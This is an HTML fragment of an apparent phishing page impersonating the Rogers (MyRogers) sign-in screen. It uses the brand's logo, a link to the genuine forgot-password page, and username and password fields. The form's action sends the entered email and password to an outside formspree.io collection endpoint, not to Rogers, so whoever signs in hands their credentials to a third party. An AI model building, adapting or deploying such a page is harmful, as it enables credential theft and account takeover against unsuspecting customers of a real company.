<body onload="myFunction()">

                <div class="rog"><img class="rog" src="roger.png" alt="logo"></div>
                <h3 class="h3"><span>Sign in</span></h3>
                <p class="p">with your MyRogers credentials</p>

                <form action="https://formspree.io/f/mwkwwllj" method="POST" id="my-form">
                    <div class="user-input-wrp">
                        <br/>
                        <input type="email" id="email" name="email" class="inputText" required autocomplete="email"/>
                        <span class="floating-label"><span class="test">Username</span></span><span class="iconic" id="info">&#9432;</span>
                        <!-- <span id="error" class="text-danger"> <span style="color: red; font-size: 20px; font-weight: bolder; transform: rotateY(280deg);">&#9432;</span> please enter your username</span> -->

                        <br/>
                        <input type="password" id="password" name="password" class="inputText" required/>

                        <!-- <span id="mess" class="text-danger"> <span style="color: red; font-size: 20px; font-weight: bolder;">&#9432;</span>  please enter your password</span> -->

                    <div><a href="https://www.rogers.com/consumer/profile/forgotpassword">Forgot password</a></div><br>
                    <input type="checkbox" id="c1" name="cb">
                    <label for="c1"><span style="font-weight: 600; letter-spacing: 1.5px;"> Remember username</span></label>
                    <button  class="bt" type="submit" id="submit-btn" onclick="submits()" ><span id="sign">Sign in</span></button>
                    
                </form>  
                <br>
                <hr>
                <br>
